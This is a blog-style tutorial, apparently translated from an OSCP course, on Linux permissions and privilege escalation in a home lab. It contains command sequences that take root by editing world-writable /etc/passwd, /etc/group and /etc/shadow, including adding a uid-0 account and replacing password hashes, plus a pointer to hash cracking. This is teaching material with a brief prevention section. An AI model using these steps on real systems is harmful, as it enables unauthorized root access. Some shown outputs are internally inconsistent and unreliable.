---
title: "From Linux Permissions Introduction to Privilege Escalation Attacks (Exploiting Bad Permissions)"
description: To understand the fundamental offensive security concept of privilege escalation
date: 2024-12-19
tags: ["Linux", "Security", "Offensive Security"]
---

## Table of Contents

- [Privilege Escalation (chmod)](#privilege-escalation-chmod)
- [Understanding Permissions](#understanding-permissions)
- [Privilege Escalation (chmod)](#privilege-escalation-chmod)
- [Exploiting Bad Permissions on passwd](#exploiting-bad-permissions-on-passwd)
- [Another Way to Exploit passwd](#another-way-to-exploit-passwd)
- [How to Stop It?](#how-to-stop-it)
- [Challenge](#challenge)
- [Group File Introduction](#group-file-introduction)
- [Exploiting Bad Permissions on Group File](#exploiting-bad-permissions-on-group-file)
- [How to Find 777](#how-to-find-777)
- [RWXRWXRWX /etc/shadow](#rwxrwxrwx-etc-shadow)
- [References](#references)

## Privilege Escalation

To understand the fundamental offensive security concept of privilege escalation attacks, we will start with basic elements of Linux permissions.  
Privilege escalation attacks refer to attempts by an attacker to gain unauthorized access or escalate their access rights beyond those granted to them.  
The following summary includes commands that may contain exploits, so use caution depending on your environment.

## Understanding Permissions

Look at the part `-rw-r--r--` below:

```shell
┌──(ocat㉿localhost)-[~]
└─$ ls -l /etc/passwd
-rw-r--r-- 1 root root 3159 Nov 25 13:27 /etc/passwd
```

The meaning is:

- The user has `read` and `write` permissions.
- The group and world have `read` permission only.

The meanings of `r` and `w` are as shown in the image below:

To summarize:

- Administrator categories:
  - Owner permission (User)
  - Group permission (Group)
  - Other users' permission (World)
- Types of permissions:
  - Read permission (r)
  - Write permission (w)
  - Execute permission (x)

So, when looking at the initial command line, we can see that the User has `read` and `write` permissions, while the Group and World have `read` permission only.

## Privilege Escalation (chmod)

To escalate privileges, you need to use `chmod`.  
The strongest permission setting with `chmod` is `chmod 777`.  
This command gives read, write, and execute permissions to the owner, group, and all users for the file or directory.  
The number 7 is equivalent to binary `111`, meaning that read (4), write (2), and execute (1) permissions are all granted.

```shell
┌──(ocat㉿localhost)-[~]
└─$ sudo chmod 777 /etc/passwd
┌──(ocat㉿localhost)-[~]
└─$ ls -l /etc/passwd
-rwxrwxrwx 1 root root 3159 Nov 25 13:27 /etc/passwd
```

You can also display the permissions in octal notation.  
[Reference Article](https://life-is-command.com/chmod_ls_stat/)

The following section is a rough translation from [Linux Privilege Escalation Examples From Zero to Hero - OSCP](https://www.udemy.com/share/103tGu3@l8xpojxboxdTzpXmCo7O1nMlwc2JAojQWzTxn4UZiEqDPVh85a7iMneoPPsFURfE/).

If you know basic Linux commands, it should be easy to understand.  
If you try this, it's better to set up a virtual environment like a hacking lab (Linux, Ubuntu, Kali, or any environment, but the output of commands may differ depending on the environment. I set up a Kali Server).

### SSH Flow

1. [On Kali Linux] `sudo systemctl start ssh`
2. [On Kali Linux] `sudo systemctl enable ssh`
3. [On Kali Linux] Check the IP address with `ifconfig` (something like 192.xxx.xx.x).
4. [On Mac] `ssh ocat@192.xxx.xx.x` (Do not use root for this).
5. [On Mac] You will be prompted for a password; enter the Kali Linux password.
6. [On Mac] If it's the first time, you'll be asked, "The authenticity of host 'xxx.xxx.xx.xx (xxx.xxx.xx.x)' can't be established." Type `yes`.
7. [On Mac] Once you see the Kali Linux prompt, you're done.

## Exploiting Bad Permissions on passwd

"Exploiting Invalid Permissions on Password"  
Here, `ocat` has root privileges, but this example will show privilege escalation from a user who does not have root access.

```shell
whoami
ocat
# Create a user called 'user'
sudo useradd user
# Set a password for 'user'
sudo passwd user
ls -l /etc/passwd
-rw-r--r-- 1 root root 3409 Dec 14 09:20 /etc/passwd
# The above permissions are weak, so we escalate them
sudo chmod 777 /etc/passwd
ls -l /etc/passwd
-rwxrwxrwx 1 root root 3409 Dec 14 09:20 /etc/passwd
# Now, with full permissions, let's change the root password
# First, generate the password
openssl passwd hacked123
$1$WZv9DkcY$miAFvpNYY/pNLrSvkEZv0.
# Edit the passwd file
vi /etc/passwd
# Change root:x:0:0:root:/root:/usr/bin/zsh to
# root:$1$WZv9DkcY$miAFvpNYY/pNLrSvkEZv0.:0:0:root:/root:/usr/bin/zsh
# Save and login
su root
```

## Another Way to Exploit passwd

"Other Ways to Exploit Passwords"  
In this method, you will log in as `newocat` and `newroot`, but you'll mainly use the profiles of `ocat` and `root`.

```shell
# Login as user
su user
# Verify you're user
whoami
user
# Generate password
openssl passwd 123456
$1$iDaiqw3L$eJhRFa1syijyRR0SugGP70
cat /etc/passwd | grep ocat
# ocat:x:1000:1000:koki oka,,,:/home/ocat:/usr/bin/zsh
vi /etc/passwd
# Add newocat, newroot entries
# newocat:$1$iDaiqw3L$eJhRFa1syijyRR0SugGP70:1000:1000:koki oka,,,:/home/ocat:/usr/bin/zsh
# newroot:$1$iDaiqw3L$eJhRFa1syijyRR0SugGP70:0:0:root:/root:/usr/bin/zsh
# Login as newocat
su newocat
ocat@localhost
# Verify it's ocat
whoami
ocat
# Login as newroot
su newroot
root@localhost
# Verify it's root
whoami
root
```

## How to Stop It?

"How to Prevent Privilege Escalation"  
In this case, we give 644 permissions.

```shell
chmod 644 /etc/passwd
su user
ls -l /etc/passwd
# When you try editing with vi, it will show `readonly`.
```

## Challenge

"How to Create an Intermediate User"  
An intermediate user has higher privileges than a normal user but not full root privileges.  
Currently, `ocat` has user management privileges (root).

```shell
┌──(ocat㉿localhost)-[~]
└─$ ls -l /etc/passwd
-rw-r--r-- 1 root root 3409 Dec 17 15:41 /etc/passwd
```

The `/etc/passwd` file has read access.  
We need to create a group file instead of `passwd`.

```shell
sudo chmod 777 /etc/group
```

Now, this permission is changed to allow read, write, and execute access for everyone.

```shell
ls -l /etc/group
-rwxrwxrwx 1 root root 1278 Nov 25 13:27 /etc/group
```

Now, let's log in as the user.

```shell
# Log in
su user
# Verify
whoami
ocat
groups ocat
ocat : ocat adm dialout cdrom floppy sudo audio dip video plugdev users netdev wireshark bluetooth scanner kaboxer
```

## Group File Introduction

"What is a Group File?"  
On Linux and Unix OS, users can be classified into groups.  
Each line in the file contains one entry.

- Actual code:
  - cdrom:x:24:vivek,student13,raj
- Code meaning:
  - Group name : Password : Group ID : Group list

The group list shows the users who are members of the group.  
If a user has read and write access to this file, they can add users to the group.

## Exploiting Bad Permissions on Group File

"Exploiting Invalid Permissions on Group File"  
Currently, the group file has bad permissions, so we will exploit this by adding the user `suzuki`.

```shell
# Check permissions on /etc/group
ls -l /etc/group
-rw-rw-r-- 1 root root 1278 Nov 25 13:27 /etc/group
# Escalate permissions
sudo chmod 777 /etc/group
[sudo] password for ocat:
ls -l /etc/group
-rwxrwxrwx 1 root root 1278 Nov 25 13:27 /etc/group
# Add user suzuki
sudo adduser suzuki
info: Adding user `suzuki' ...
info: Selecting UID/GID from range 1000 to 59999 ...
info: Adding new group `suzuki' (1002) ...
info: Adding new user `suzuki' (1002) with group `suzuki (1002)` ...
info: Creating home directory `/home/suzuki` ...
info: Copying files from `/etc/skel` ...
New password:
Retype new password:
passwd: password updated successfully
Changing the user information for suzuki
Enter the new value, or press ENTER for the default
    Full Name []: suzuki test
    Room Number []:
    Work Phone []:
    Home Phone []:
    Other []:
Is the information correct? [Y/n] y
info: Adding new user `suzuki` to supplemental / extra groups `users` ...
info: Adding user `suzuki` to group `users` ...
# Log in as suzuki
su suzuki
Password:
# In home
cd ~
# Verify it's suzuki
whoami
suzuki
# Check suzuki's groups
groups suzuki
suzuki : suzuki users
# Check /etc/group permissions for suzuki
ls -l /etc/group
-rw-rw-r-- 1 root root 1300 Dec 14 09:20 /etc/group
# Log in as ocat again
su ocat
Password:
# Escalate /etc/group permissions
sudo chmod 777 /etc/group
# Log in as suzuki again
su suzuki
Password:
# Confirm escalated permissions
ls -l /etc/group
-rwxrwxrwx 1 root root 1300 Dec 14 09:20 /etc/group
# Add suzuki to _ssh
vi /etc/group
# ...
# _ssh:x:113:suzuki
# ...
```

Exit all users first.  
Then log in via SSH as suzuki.

```shell
# It's faster to restart the terminal
exit
ssh suzuki@192.xxx.xx.x
┌──(suzuki㉿localhost)-[~]
└─$
```

Now you can SSH into the system as `suzuki`.  
From here, you can add `suzuki` to many groups for further privilege escalation.

## How to Find 777

"How to Find Files with Permissions"  
Now logged in as suzuki:

```shell
whoami
suzuki
groups suzuki
suzuki : suzuki users _ssh
```

Since suzuki is in the ssh group, SSH access is possible.  
To find executable files, run the following command (search any file directory).

```shell
find / -type f -perm 777
```

If you encounter errors or access is denied, you need to handle those permissions using the above commands.  
Try the following on `/tmp/null`.

```shell
find / -type f -perm 777 2>/tmp/null
-bash: /tmp/null: Permission denied
# Try various approaches
find / -type f -perm 777 2>/
-bash: /: Is a directory
find / -type f -perm 777 2>/home
-bash: /home: Is a directory
find / -type f -perm 777 2>/home/suzuki/
-bash: /home/suzuki/: Is a directory
find / -type f -perm 777 2>
-bash: syntax error near unexpected token `newline'
```

It seems `suzuki` doesn't have bash, so to move forward, create a new file:

```shell
# Create a file
touch /home/suzuki/null
# Check
ls /home/suzuki/
null
# Verify permissions
# If it's not -rw-rw-r--, adjust permissions
ls -l /home/suzuki
-rw-rw-r-- 1 suzuki suzuki 163502 Dec 17 10:19 null
# Look for 777 permissions
find / -type f -perm 777 2>/home/suzuki/null
/etc/shadow
/etc/group
```

Passwords used for Linux user logins are stored in `/etc/shadow`.  
Lastly, check the permissions of `/etc/shadow` and `/etc/group`.

```shell
ls -l /etc/shadow
-rwxrwxrwx 1 root shadow 1583 Dec 14 09:19 /etc/shadow
ls -l /etc/group
-rwxrwxrwx 1 root root 1324 Dec 17 10:14 /etc/group
```

## RWXRWXRWX /etc/shadow

Here, we will escalate privileges on `/etc/shadow`.  
The ultimate goal is to change `ocat`'s password and `root`'s password.  
First, check the contents of `/etc/shadow`.

```shell
cat /etc/shadow
ocat:xxxxxxxxxxxxxx...
user:xxxxxxxxxxxxxx...
suzuki:xxxxxxxxxxxxxx...
# You should see the hashed passwords.
```

Create the password with `openssl`:

```shell
openssl passwd hacked123
```

Once created, replace the hash in `/etc/shadow` for `ocat:xxxxxx…` with the new hash.

```shell
vi /etc/shadow
su ocat
password:

# login done
```

Then try the same with root.

```shell
su root
# root
```

This is the first time you **gain root** privileges.  
Additionally, a more advanced action would be to use tools like hashcat to crack the hash if you can view it.  
A useful website for hash identification is:  
[https://www.onlinehashcrack.com/hash-identification.php](https://www.onlinehashcrack.com/hash-identification.php)

# References

- [Udemy] Linux Privilege Escalation For The OSCP Training
- [Linux permissions and octal, why do you say 775 or 600?](https://qiita.com/ATS534/items/1cd31518f20b0dc0f078)
- [https://www.onlinehashcrack.com/hash-identification.php](https://www.onlinehashcrack.com/hash-identification.php)

---
